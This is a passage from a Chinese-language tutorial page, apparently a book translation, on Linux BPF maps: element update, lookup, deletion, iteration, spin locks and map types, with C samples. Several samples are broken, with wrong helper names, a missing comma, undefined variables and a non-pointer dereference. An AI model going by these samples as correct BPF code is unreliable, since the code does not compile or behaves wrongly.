第二个是指向我们要更新的键的指针。 因为内核不知道我们要更新的键的类型，所以这个方法被定义为一个指向<code>void</code>的不透明指针，这意味着我们可以传递任何数据。第三个参数是我们要插入的值。 此参数使用与<code>key</code>参数相同的语义。 在本书中，我们展示了一些如何利用不透明指针的高级示例。 你可以使用此函数中的第四个参数来更改<code>map</code>的更新方式。这个参数可以取三个值：</p><ul><li>如果你传递0，你告诉内核你想要更新元素如果它存在或不存在它都应该在映射中创建元素。</li><li>如果你传递1，你告诉内核只在元素不存在时创建它。</li><li>如果你传递2，内核只会在元素存在时更新它。</li></ul><p>这些值被定义为你可以使用的常量，而不必记住整数语义。值为<code>BPF_ANY</code>表示0，<code>BPF_NOEXIST</code>表示1，<code>BPF_EXIST</code>表示2。</p><p>让我们使用在上一节中定义的映射来编写一些示例。 在我们的第一个示例中，我们向<code>map</code>添加了一个新值。 因为<code>map</code>是空的，我们可以假设任何更新行为都是正常的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result;</span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用<code>strerror</code>来描述<code>errno</code>变量中的错误集。 你可以使用<code>man strerror</code>在手册页上了解有关此功能的更多信息。现在让我们看看当我们尝试创建具有相同键的元素时会得到什么结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_NOEXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>因为我们已经在<code>map</code>中创建了一个键为1的元素，调用<code>bpf_map_update_elem</code>的结果将为-1，<code>errno</code>值为<code>EEXIST</code>。 该程序将在屏幕上打印以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (File exists)</span><br></pre></td></tr></table></figure><p>同样，让我们更改此程序以尝试更新一个不存在的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1234</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_EXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>使用标志<code>BPF_EXIST</code>，此操作的结果将再次为-1。 内核会将<code>errno</code>变量设置为<code>ENOENT</code>，程序将打印以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (No such file <span class="keyword">or</span> directory)</span><br></pre></td></tr></table></figure><p>这些示例展示了如何从内核程序中更新映射。 你还可以从用户空间程序中更新映射。 执行此操作的助手与我们刚刚看到的类似， 唯一的区别是它们使用文件描述符来访问映射，而不是直接使用指向映射的指针。我们知道，用户空间程序总是使用文件描述符访问映射。 因此，在我们的示例中，我们将参数<code>my_map</code>替换为全局文件描述符标识符<code>map_data[0].fd</code>。 在这种情况下，原始代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="读取BPF映射中的元素"><a href="#读取BPF映射中的元素" class="headerlink" title="读取BPF映射中的元素"></a>读取BPF映射中的元素</h4><p>BPF还提供了两个不同的帮助器来根据你的代码运行的位置从映射中读取。 这两个助手都称为 <code>bpf_map_lookup_elem</code>。 和更新助手一样，它们的第一个参数不同， 内核方法采用对映射的引用，而用户空间助手采用映射的文件描述符标识符作为其第一个参数。两种方法都返回一个整数来表示操作是失败还是成功，就像更新助手一样。 这些帮助器中的第三个参数是指向代码中变量的指针，该变量将存储从映射中读取的值。 我们根据上一节中看到的代码提供两个示例。</p><p>第一个示例是BPF程序在内核上运行时读取插入到映射中的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(&amp;my_map, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>如果我们试图读取的键<code>bpf_map_lookup_elem</code>返回一个负数，它将<code>errno</code>变量中设置错误。 例如，如果我们在尝试读取并没有插入的值，内核将返回“未找到”错误<code>ENOENT</code>。</p><p>第二个示例与刚刚看到的示例类似，但这次我们从运行在用户空间的程序中读取映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>这就是我们能够访问BPF映射中的信息所需的全部内容。 我们将在后面的章节中研究不同的工具包是如何简化这一点的，以使访问数据变得更加简单。 接下来我们来谈谈从映射中删除数据。</p><h4 id="删除BPF映射中的元素"><a href="#删除BPF映射中的元素" class="headerlink" title="删除BPF映射中的元素"></a>删除BPF映射中的元素</h4><p>我们可以在<code>map</code>上执行的第三个操作是删除元素。 与写入和读取元素一样，BPF为我们提供了两个不同的帮助器来删除元素，都称为<code>bpf_map_delete_element</code>。和前面的例子一样，当你在内核上运行的程序中使用这些助手时，它们使用对映射的直接引用，当你在运行用户空间的程序中使用它们时，它们使用映射的文件描述符标识。</p><p>第一个示例是BPF程序在内核上运行时删除了插入到映射中的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(&amp;my_map, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>如果你尝试删除的元素不存在，内核将返回一个负数。 在这种情况下，它还会使用“未找到”错误<code>ENOENT</code>填充<code>errno</code>变量。</p><p>第二个示例是当BPF程序运行在用户空间时删除元素`</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(map_data[<span class="number">0</span>].fd, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="迭代BPF映射中的元素"><a href="#迭代BPF映射中的元素" class="headerlink" title="迭代BPF映射中的元素"></a>迭代BPF映射中的元素</h4><p>我们在本节中看到的最后一个操作可以帮助你在BPF程序中找到任意元素。 有时你不知道要查找的元素的确切键，或者只想查看<code>map</code>中的内容。BPF为此提供了一个名为<code>bpf_map_get_next_key</code>的指令。 此指令仅适用于在用户空间运行的程序。</p><p>这个帮助器为你提供了一种确定的方式来迭代<code>map</code>上的元素，但它不如大多数编程语言中的迭代器那么直观。 它需要三个参数。第一个是<code>map</code>的文件描述符标识符，第二个参数<code>key</code>是要查找的标识符，第三个参数<code>next_key</code>是映射中的下一个键。我们更喜欢将第一个参数称为<code>lookup_key</code>。 当你调用这个帮助器时，BPF会尝试在这个<code>map</code>中使用作为查找键传递的键来查找元素， 然后，它将<code>next_key</code>参数设置为映射中的相邻键。 所以如果你想知道<code>key 1</code>之后是哪个<code>key</code>，你需要设置1作为你的查找<code>key</code>，如果<code>map</code>有一个与这个<code>key</code>相邻的<code>key</code>，BPF会将它设置为<code>next_key</code>参数的值。</p><p>在查看<code>bpf_map_get_next_key</code>的工作原理之前，让我们在<code>map</code>中多添加一些元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> new_key, new_value, it; </span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">2</span>;it&lt;<span class="number">6</span>;it++)&#123;</span><br><span class="line">  new_key = it;</span><br><span class="line">     new_value = <span class="number">1234</span> + it;</span><br><span class="line">     bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;new_key, &amp;new_value, BPF_NOEXIST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要打印映射中的所有值，可以将<code>bpf_map_get_next_key</code>与映射中不存在的查找键一起使用。 这会强制BPF从<code>map</code>的开头开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line">lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><p>你可以看到在循环结束时将下一个键分配给<code>lookup_key</code>， 这样，我们继续遍历<code>map</code>，直到终点。 当<code>bpf_map_get_next_key</code>到达<code>map</code>末尾时，返回值为负数，<code>errno</code>变量设置为<code>ENOENT</code>。 这将中止循环执行。</p><p><code>bpf_map_get_next_key</code>可以查找从<code>map</code>中任意点开始的键，如果你只想要另一个特定键的下一个键，则不需要从<code>map</code>的开头开始。</p><p>许多编程语言在遍历其元素之前会复制映射中的值。 如果你的程序中的某些其他代码试图改变<code>map</code>，这样可以防止一些未知行为。如果该代码从<code>map</code>中删除元素，这将会是一个危险的操作。BPF在使用<code>bpf_map_get_next_key</code>循环之前不会复制映射中的值。如果程序的另一部分在循环遍历值时从<code>map</code>中删除了一个元素，则<code>bpf_map_get_next_key</code>将重新开始进行遍历。 让我们看一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line"><span class="keyword">if</span> (next_key == <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Deleting key '2'\n"</span>);</span><br><span class="line">    bpf_map_delete_element(map_data[<span class="number">0</span>].fd &amp;next_key);</span><br><span class="line">&#125;</span><br><span class="line">    lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序的打印输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">Deleteing key '2'</span><br><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><h4 id="查找和删除元素"><a href="#查找和删除元素" class="headerlink" title="查找和删除元素"></a>查找和删除元素</h4><p>内核公开的另一个用于处理<code>map</code>的函数是<code>bpf_map_lookup_and_delete_elem</code>。此函数在<code>map</code>中搜索给定键并从中删除元素。同时，它把元素的值写入一个变量供程序使用。 当你使用队列和堆栈映射时，此函数会派上用场，而且，它不仅限于与这些类型的映射一起使用。 让我们看一个示例，说明如何将它与我们在之前示例中使用的<code>map</code>一起使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result, it; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">0</span>;it&lt;<span class="number">2</span>;it++)&#123;</span><br><span class="line">result = bpf_map_lookup_and_delete_element(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line">  <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们尝试从<code>map</code>中获取相同的元素两次。在第一次遍历中，这段代码将打印<code>map</code>中元素的值。 但是，因为我们使用的是<code>bpf_map_lookup_and_delete_element</code>，所以第一次遍历也会从<code>map</code>中删除元素。 循环第二次尝试获取元素时，此代码将失败，并将使用“未找到”错误<code>ENOENT</code>填充<code>errno</code>变量。</p><h4 id="并发访问map元素"><a href="#并发访问map元素" class="headerlink" title="并发访问map元素"></a>并发访问map元素</h4><p>使用<code>BPF map</code>的挑战之一是许多程序可以同时访问相同的<code>map</code>。这可能会在我们的BPF程序中引入竞争条件，并使<code>map</code>中的资源访问变得不可预测。 为了防止竞争条件，BPF引入了BPF自旋锁的概念，它允许你在操作<code>map</code>元素时锁定对它的访问。 自旋锁仅适用于数组、散列和<code>cgroup</code>存储映射。</p><p>有两个BPF辅助函数可用于处理自旋锁：<code>bpf_spin_lock</code>用于锁定一个元素，<code>bpf_spin_unlock</code>可以解锁该元素。这些辅助函数使用信号量的结构来访问包含此信号量的元素。 当信号量被锁定时，其他程序无法访问元素的值，它们会一直等到信号量被解锁。 同时，BPF自旋锁引入了一个新的标志，用户空间程序可以使用它来改变锁的状态。该标志称为<code>BPF_F_LOCK</code>。使用自旋锁我们需要做的第一件事是创建我们想要锁定访问的元素，然后添加我们的信号量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> &#123;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_spin_lock</span> <span class="title">semaphore</span>;</span> </span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会把这个结构存储在<code>BPF map</code>中，并在元素中使用信号量来防止对它的不当访问。 现在，我们可以声明将包含这些元素的<code>map</code>。 此<code>map</code>必须使用BPF类型格式(BTF)进行注释，以便验证器知道结构。 类型格式通过向二进制对象添加调试信息，使内核和其他工具对BPF数据结构有更丰富的理解。因为这段代码将在内核中运行，我们可以使用<code>libbpf</code>提供的内核宏来注释这个并发映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> concurrent_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(struct concurrent_element), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">&#125;;</span><br><span class="line">BPF_ANNOTATE_KV_PAIR(concurrent_map, <span class="keyword">int</span>, struct concurrent_element);</span><br></pre></td></tr></table></figure><p>在BPF程序中，我们可以使用两个锁辅助函数来保护这些元素免受竞争条件的影响。即使信号量被锁定，我们的程序也保证能够安全地修改元素的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> <span class="title">init_value</span> = &#123;</span>&#125;; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> *<span class="title">read_value</span>;</span></span><br><span class="line">  bpf_map_create_elem(&amp;concurrent_map, &amp;key, &amp;init_value, BPF_NOEXIST);</span><br><span class="line">  read_value = bpf_map_lookup_elem(&amp;concurrent_map, &amp;key);</span><br><span class="line">  bpf_spin_lock(&amp;read_value-&gt;semaphore);</span><br><span class="line">  read_value-&gt;count += <span class="number">100</span>;</span><br><span class="line">  bpf_spin_unlock(&amp;read_value-&gt;semaphore);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码通过初始化我们的并发映射来锁定对其值的访问。 然后，它从映射中获取该值并锁定其信号量，以便它可以保存计数值，从而防止数据竞争。 使用完该值后，它会释放锁，以便其他映射可以安全地访问该元素。</p><p>在用户空间，我们可以通过使用标志<code>BPF_F_LOCK</code>来保存对并发映射中元素的引用。你可以将此标志与<code>bpf_map_update_elem</code>和<code>bpf_map_lookup_elem_flags</code>辅助函数一起使用。 这个标志允许你更新元素而不用担心数据竞争。</p><p>自旋锁并不总是有用。 如果您只是在<code>map</code>中聚合值，则不需要使用自旋锁。 但是，如果你想确保并发程序在对它们执行多个操作时不会更改映射中的元素，从而保持原子性，那么自旋锁就很有用。</p><h3 id="BPF映射类型"><a href="#BPF映射类型" class="headerlink" title="BPF映射类型"></a>BPF映射类型</h3><h4 id="哈希表映射"><a href="#哈希表映射" class="headerlink" title="哈希表映射"></a>哈希表映射</h4><p>哈希表映射是第一个添加到BPF的通用映射。 它们使用<code>BPF_MAP_TYPE_HASH</code>类型定义。你可以使用任何大小的键和值， 内核会根据需要分配和释放它们。当你在哈希表映射上使用<code>bpf_map_update_elem</code>时，内核会自动替换元素。哈希表映射经过优化，查找速度非常快，它们对于保存经常读取的结构化数据很有用。让我们看一个使用它们来跟踪网络IP及其速率限制的示例程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> IPV4_FAMILY 1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> &#123;</span> </span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">        __u32 v4_addr;</span><br><span class="line">        __u8 v6_addr[<span class="number">16</span>];</span><br><span class="line">      &#125;;</span><br><span class="line">      __u8 family;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> counters </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(struct ip_key), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这段代码中，我们声明了一个结构化的<code>key</code>，我们将使用它来保存有关IP地址的信息。 我们定义了我们的程序将用来跟踪速率限制的映射。你可以看到我们在此映射中使用IP地址作为键。 这些值将是我们的BPF程序从特定IP地址接收网络数据包的频率次数。</p><p>我们可以编写一个代码片段来更新内核中的这些计数器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">update_counter</span><span class="params">(<span class="keyword">uint32_t</span> ipv4)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">uint64_t</span> value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> <span class="title">key</span> = &#123;</span>&#125;;</span><br><span class="line">key.v4_addr = ip4;</span><br><span class="line">key.family = IPV4_FAMILY;</span><br><span class="line">  bpf_map_lookup_elem(counters, &amp;key, &amp;value);</span><br><span class="line">  (*value) += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数获取从网络数据包中提取的IP地址，并使用我们声明的复合键执行映射查找。 在这种情况下，我们假设我们之前已经用零值初始化了计数器； 否则，<code>bpf_map_lookup_elem</code>调用将返回一个负数。</p><h4 id="数组映射"><a href="#数组映射" class="headerlink" title="数组映射"></a>数组映射</h4><p>数组映射是添加到内核的第二种类型的BPF映射。 它们使用<code>BPF_MAP_TYPE_ARRAY</code>类型定义。 当你初始化一个数组映射时，它的所有元素都预先分配在内存中并设置为零值。 因为这些映射是由一个元素切片支持的，所以键是数组中的索引，它们的大小必须正好是四个字节。使用数组映射的一个缺点是无法删除映射中的元素，并且无法使数组小于实际值。如果你尝试在数组映射上使用<code>map_delete_elem</code>，调用将失败，结果会收到错误<code>EINVAL</code>。</p><p>数组映射通常用于存储可以改变值的信息，但它的行为通常是固定的。 人们使用它来存储具有预定义分配规则的全局变量。因为你不能删除元素，所以可以假设特定位置的元素总是代表同一个元素。要记住的另一件事是<code>map_update_elem</code>不是原子的，就像你在哈希表映射中看到的那样。如果正在进行更新，同一程序可以同时从同一位置读取不同的值。 如果将计数器存储在数组映射中，则可以使用内核的内置函数<code>__sync_fetch_and_add</code>对映射的值执行原子操作。</p><h4 id="程序数组映射"><a href="#程序数组映射" class="headerlink" title="程序数组映射"></a>程序数组映射</h4><p>程序数组映射是第一个添加到内核的专用映射。它们使用<code>BPF_MAP_TYPE_PROG_ARRAY</code>类型定义。 你可以使用这种类型的映射来存储对BPF程序的文件描述符标识符的引用。 与辅助函数<code>bpf_tail_call</code>结合使用，此映射允许你在程序之间跳转，绕过单个BPF程序的最大指令限制并降低复杂性。</p><p>使用此专用映射时需要考虑一些事项。要记住的第一个方面是键和值的大小都必须是四个字节。要记住的第二个方面是，当你跳转到一个新程序时，新程序将重用相同的内存堆栈，因此程序不会消耗所有可用内存。最后，如果你尝试跳转到映射中不存在的程序，则尾调用将失败，当前程序将继续执行。让我们深入研究一个详细的示例，以了解如何更好地使用这种类型的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> programs </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PROG_ARRAY, </span><br><span class="line">  .key_size = <span class="number">4</span>,</span><br><span class="line">.value_size = <span class="number">4</span>,</span><br><span class="line">  .max_entries = <span class="number">1024</span>,</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>首先，我们需要声明我们的新程序映射（正如我们前面提到的，键和值的大小总是四个字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intkey=<span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] = &#123;</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>), <span class="comment">// assign r0 = 0</span></span><br><span class="line">BPF_EXIT_INSN(), <span class="comment">// return r0 </span></span><br><span 